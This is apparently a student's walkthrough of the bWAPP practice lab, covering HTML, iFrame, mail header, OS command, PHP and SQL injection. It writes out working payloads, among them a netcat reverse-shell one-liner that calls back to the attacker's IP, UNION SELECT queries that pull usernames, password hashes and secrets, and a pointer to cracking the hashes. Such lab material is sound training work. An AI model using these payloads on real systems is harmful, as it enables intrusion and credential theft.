<h1>Bwapp</h1>

#Low level

HTML Injection - Reflected (GET)

  -First, try to type infomation
  
  <img width="273" height="282" alt="image" src="https://github.com/user-attachments/assets/281910f0-62bb-4a17-8f7f-398753a581e5" />

  -Second, we can try to catch the packet by using Burp Suite and look through a get method

  <img width="747" height="352" alt="image" src="https://github.com/user-attachments/assets/84b6325a-33b4-4067-9a94-183545d03e66" />

  -Third, we can try to use a common tag in html is h1 to observe the output (We can try in the website or in Burp Suite)

  <img width="1187" height="301" alt="image" src="https://github.com/user-attachments/assets/e13ae253-5811-4dbb-95d3-af7a33fec8e2" />

  <img width="306" height="421" alt="image" src="https://github.com/user-attachments/assets/bd90769d-403b-412e-9f0f-30cbe26dec52" />

  -We can see this format is different from the first one, so it can be vulnerable
  
HTML Injection - Reflected (POST)

  -This one can be done by the same steps as GET method. However, we can use Burp Suite to observe the difference between get and post method.
  
HTML Injection - Reflected (URL)

  -This is the first appearence of the page, focus on the URL
  
  <img width="832" height="123" alt="image" src="https://github.com/user-attachments/assets/1c89f340-a454-4674-8039-0884b714a3d0" />

  -First, use Burp Suite to see packet

  <img width="586" height="376" alt="image" src="https://github.com/user-attachments/assets/1c83f19f-c705-47d3-ad34-1ab05e2c62fd" />

  -Second, try to change the host destination to observe the difference in the website
  
  <img width="1176" height="315" alt="image" src="https://github.com/user-attachments/assets/143ac81c-91a1-4735-862e-26620db06882" />

  -Now, your URL is changed

  <img width="702" height="143" alt="image" src="https://github.com/user-attachments/assets/ba2afee0-7471-4e2f-9262-d5fbcc010c10" />

HTML Injection - Stored (Blog)

  -Let's try to type a normal text into the box

  <img width="926" height="367" alt="image" src="https://github.com/user-attachments/assets/29ab4942-3684-4eec-9894-0896a20e1b4c" />

  -Firt of all, when we see a box which can be typed into, we can try to use tag h1 to test. You can see the output is different from the first one

  <img width="927" height="480" alt="image" src="https://github.com/user-attachments/assets/86496813-d736-4ed1-8f9a-f14a95bed323" />

  -Now, we can use a tag script to test xss and observe the output here

  <img width="1481" height="510" alt="image" src="https://github.com/user-attachments/assets/f9344637-ef46-4df2-90a5-8ecb00649a6d" />

iFrame Injection
  -First, look through the URL
  
  <img width="628" height="23" alt="image" src="https://github.com/user-attachments/assets/25e4a945-4dfc-436f-a75f-8669f8bae124" />

  -In this site, we can also see some useful information

  <img width="437" height="300" alt="image" src="https://github.com/user-attachments/assets/63bb5acb-b370-43b9-b0c6-0ad6c2d4b939" />

  -Now, based on such information, we can try to change the robots.txt in the URL by any disallow folder the webite gives us. Here i changed robots.txt by admin

  <img width="600" height="26" alt="image" src="https://github.com/user-attachments/assets/4694816e-a2ae-4bf7-b579-e2913f9d8deb" />

  -Now, we can easily see the difference below

  <img width="455" height="411" alt="image" src="https://github.com/user-attachments/assets/adea3967-bc86-4e76-8af2-b4fad4a742ac" />

  -However, the frame is too small. We can try to change the ParamWidth and ParamHeight in the URL to another bigger numbers

  <img width="607" height="30" alt="image" src="https://github.com/user-attachments/assets/3f83c106-5a5f-4396-bdf4-736ec1a9ba50" />

  -Now, the frame below is clearer

  <img width="935" height="882" alt="image" src="https://github.com/user-attachments/assets/7111356c-6e28-4850-8187-414ea7ec6423" />

Mail Header Injection (SMTP)

  -First, we type into boxes and use Burp Suite to catch the packet

  <img width="597" height="356" alt="image" src="https://github.com/user-attachments/assets/29ed1c77-457d-47cc-b39b-94cb23401745" />

  Now, we can try to use \nbcc: and type the hacker's email

  <img width="605" height="486" alt="image" src="https://github.com/user-attachments/assets/70a984a5-ede1-4357-8cc0-7df34134964c" />

  -We observe the status 200 means that we are successfull
  
  <img width="610" height="332" alt="image" src="https://github.com/user-attachments/assets/536dfa35-1c52-446f-bde2-7adfe7864386" />

OS Command Injection

  -You only need to use separators like ; or & or  && and use ls -la to see all things in the current directory (You can try another command to test your own :>)

  <img width="932" height="1013" alt="image" src="https://github.com/user-attachments/assets/87b8f92c-cd99-40c7-860b-792099dfebb5" />

OS Command Injection - Blind

  -In this task, if you use the same tips above, you will not see any result, so how can we ensure that the website is OS command injection vulnerable?
  -First, type any domain you want, then use any separators as the previous task with sleep 5(you can change any number, but just need a small one to test). If the website needs to wait the time you type, it is vulnerable

  <img width="726" height="168" alt="image" src="https://github.com/user-attachments/assets/4f965cee-83f6-4488-8d4c-617f732d75a9" />

  -You can see you need to waits about 5 seconds to see the response on the website, so how we can see information?

  -Now use netcat on your kali machine with the command "nc -nlvp 9001" (You can change 9001 with other ports you like)

  <img width="260" height="86" alt="image" src="https://github.com/user-attachments/assets/797ad892-680d-4884-b404-8e2d71b9a3a5" />
  
  -We can use netcat to reverse the shell from the website with the command like this "google.com | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc Your_IP_Address 9001 >/tmp/f" (Because I used 9001 in the command above so in this command is also 9001) and ping

  <img width="726" height="188" alt="image" src="https://github.com/user-attachments/assets/93338788-c111-47d0-837b-52f8fa827bd7" />

  -You can see you will have a shell now!!!

  <img width="472" height="136" alt="image" src="https://github.com/user-attachments/assets/907ce64b-774e-4070-8666-5c223b15bbde" />
  
PHP Code Injection

  -Click on message on the screen and you will see ?message pop on your URL

  <img width="520" height="180" alt="image" src="https://github.com/user-attachments/assets/07bdfd99-38a5-4dd1-8c13-0bc114206938" />

  -Now first, we change test by phpinfo() to test

  <img width="907" height="1075" alt="image" src="https://github.com/user-attachments/assets/db481184-48ec-4e78-9ed1-3b52716355ef" />

  -Now we know the website is vulnerable 
  
  -Try to use some fucntion to list information

  <img width="437" height="35" alt="image" src="https://github.com/user-attachments/assets/0b8244b0-3a5e-4bb1-b560-d21f3bf9709d" />

  -The result is below

  <img width="551" height="178" alt="image" src="https://github.com/user-attachments/assets/7a084423-7437-4a41-a0fb-897cae206245" />

SQL Injection (GET/Search)

  -First of all, we need to check whether website is vulnerable by using '

  <img width="836" height="271" alt="image" src="https://github.com/user-attachments/assets/e48abca9-ba83-4a0d-9594-4a2029e0ab51" />

  -After that, we can use true condition to list all information in the table

  <img width="837" height="705" alt="image" src="https://github.com/user-attachments/assets/24f7f008-619f-44d5-ad72-1481583e2f21" />

  -Next, we use " 'order by (1,2,3,...)-- - " until the website not inform "Error: The used SELECT statements have a different number of columns" (the correct colums is 7)

  <img width="850" height="707" alt="image" src="https://github.com/user-attachments/assets/ccd23325-436c-4d2c-8d11-8dad5db0fbbe" />

  -If we want to show sensitve information, first thing we need to know is the table contains such infomation

  -To do that, we can use " 'UNION SELECT 1, table_name, 3, 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema = database()-- -" to show all tables in the schema

  <img width="817" height="827" alt="image" src="https://github.com/user-attachments/assets/179b3506-8503-4b49-a032-3af4763cbd8d" />

 -Why we put table_name into the second position? This is because when you use " 'UNION SELECT 1, 2, 3, 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema = database()-- - ", you will see the number pop up on your screen. They are the columns displayed on the screen

 <img width="817" height="258" alt="image" src="https://github.com/user-attachments/assets/0be01bcd-76a1-4409-95c0-4822999344d1" />

-You can see although we know the table has 7 columns but just 4 of them are displayed (2,3,5,4). Thus, if you put table_name into the columns instead of them, you will not see anything.

-Moreover, the reason why I use "FROM information_schema.tables" is that this schema stores all tables and "WHERE table_schema = database()" will choose the current database (Bwapp)

-Ok, let's move on to the next step, when we select table_name, we need to focus on a table that may contains sensitive information(in this case is users table)

<img width="817" height="251" alt="image" src="https://github.com/user-attachments/assets/746ae1b3-70b8-4547-bed3-b822c8425a86" />

-Next, we need to know what are the names of all columns in this table by using " 'union select 1, column_name,3,4,5,6,7 from information_schema.columns where table_schema = database()-- -"

<img width="822" height="1042" alt="image" src="https://github.com/user-attachments/assets/9afecf5b-e0fd-49ed-b41b-a0dae2145a06" />

-Why this table has many columns but we just need to use 1,...7? This is because the select command of the website just use 7 of them.

-Now, we can select many columns that you think it is worth. For me, I will choose id, login, password, and secret

-So the command is " 'union select 1, id, login, password, secret, 6, 7 from users-- - "

<img width="823" height="153" alt="image" src="https://github.com/user-attachments/assets/903119af-c8fb-4ce9-8e94-7b4061152481" />

-Oh, password is encrypted, how to crack it? We can search Crackstation on the website and use it to crack the hash

<img width="1011" height="370" alt="image" src="https://github.com/user-attachments/assets/c033eaad-0073-4e32-bce2-8787f574f939" />

SQL Injection (POST/Select)

 -There is no site to type, so the idea is use Burp Suite to catch the packet

 -We can check the last command that I explained above

 <img width="1181" height="422" alt="image" src="https://github.com/user-attachments/assets/01dd7c06-41ce-402f-bedb-68b66817d36b" />

 -However, this task is different from other SQLi tasks
 
 <img width="707" height="247" alt="image" src="https://github.com/user-attachments/assets/7d37de49-1578-43bf-b796-b6abda6bc182" />

 -This error means the command is like " select....'1'union select 1, id, login, password, secret, 6, 7 from users-- -'lo ". it means we need to close the quote before union

 -To fix that, the easiest way is use '' instead of ' and delete number 1

 <img width="1153" height="402" alt="image" src="https://github.com/user-attachments/assets/7970cdde-6499-4b96-9501-3b275237c6e7" />

 -We get it

 <img width="818" height="287" alt="image" src="https://github.com/user-attachments/assets/d6150937-5aa9-423f-b8f2-7a5af0f38280" />

SQL Injection (AJAX/JSON/jQuery)
  -Try to type the condition true without enter, we can see it will show us all movies. Therefore, in this case, we just need to use 'union select 1, id, login, password, secret, 6, 7 from users-- -, it will show all

  <img width="973" height="1037" alt="image" src="https://github.com/user-attachments/assets/f1a27645-02f5-481d-85cd-1e0224305bbb" />

SQL Injection (Login Form/Hero)

  -This task is easy, you just need to use true condition to login into superhero

  <img width="828" height="323" alt="image" src="https://github.com/user-attachments/assets/15b48be1-d209-4d65-848a-8ad9aa27d5df" />
  
SQL Injection (Login Form/User)

  -First, you can create your own user like this picture below

  <img width="768" height="598" alt="image" src="https://github.com/user-attachments/assets/683f657f-b3ae-4d11-9b9f-dda51683199f" />

  -After that, you login into your account. You will see your secret on the screen

  <img width="873" height="412" alt="image" src="https://github.com/user-attachments/assets/415e9a51-7078-4d20-949d-6743bd941a68" />

SQL Injection - Stored (Blog)

  -First, I test with ' and you can see it inform an error
  
  <img width="957" height="317" alt="image" src="https://github.com/user-attachments/assets/cfdc3c1c-22bc-4694-a2a2-eddd5f96dc86" />

  -Based on this error, we can use select command to show information in table. The reason I use group_concat is because the website limits the number of parameters is one. Using group_concat helps us get all useful information in just one command

  <img width="976" height="486" alt="image" src="https://github.com/user-attachments/assets/06ae2c1c-a88e-4154-bc87-ec1c4dcfe305" />

SQL Injection - Stored (User-Agent)  

  -First, using Burp Suite to catch the packet
  
  -Second, change the User Agent with your own command as the picture below, then forward the packet

  <img width="607" height="467" alt="image" src="https://github.com/user-attachments/assets/c17dfb01-d641-4e96-9f66-ce0de617531a" />

  -Last, go back to the website and you will see information

  <img width="808" height="486" alt="image" src="https://github.com/user-attachments/assets/38a1ca41-fd51-4ccb-9e2e-917b4d84e4e7" />

SQL Injection - Blind - Time-Based

  -Check it with simple command " 'or 1=1 and sleep 5-- - ", if the page loads longer than normal, it is vulnerable

  -Next, use sqlmap to scan databases on this page

  <img width="852" height="87" alt="image" src="https://github.com/user-attachments/assets/7ce14089-5de2-4488-936b-430b5ce57a48" />

  <img width="212" height="101" alt="image" src="https://github.com/user-attachments/assets/9c13e8be-7c00-457d-97cb-e7d5dba60813" />

  -When we know databases, we can use this following command to show all tables in it

  <img width="863" height="77" alt="image" src="https://github.com/user-attachments/assets/325a7109-999c-4f92-944d-92456f076680" />

  <img width="177" height="147" alt="image" src="https://github.com/user-attachments/assets/0efbb83b-ae80-4a16-ba84-e56bf75e742e" />

  -Lastly, we can use command to list all columns in the table

  <img width="851" height="77" alt="image" src="https://github.com/user-attachments/assets/9beb8d43-d0d6-4ae2-bb48-a5f8be246c50" />

  <img width="281" height="255" alt="image" src="https://github.com/user-attachments/assets/ae1ecb5e-2dfe-4081-b516-d5e3d1980710" />

  

 

 




  
  

  
